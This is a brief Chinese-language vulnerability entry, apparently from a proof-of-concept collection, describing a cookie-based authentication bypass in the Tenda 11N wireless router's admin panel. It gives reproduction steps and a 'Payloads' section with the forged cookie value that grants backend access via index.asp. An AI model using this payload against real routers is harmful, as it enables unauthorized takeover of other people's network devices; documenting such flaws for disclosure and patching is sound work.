# Tenda 11N无线路由器 Cookie 越权访问漏洞

## 漏洞描述
Tenda 11N无线路由器由于只验证Cookie，导致任意用户伪造Cookie即可进入后台

## 危害等级
LOW

## 参考链接

## 漏洞复现方法
登录页面

![image-20220519180949727](images/202205191809768.png)

添加Cookie, 访问 index.asp 进入后台

```
admin:language=cn
```


## Payloads
```
admin:language=cn
```
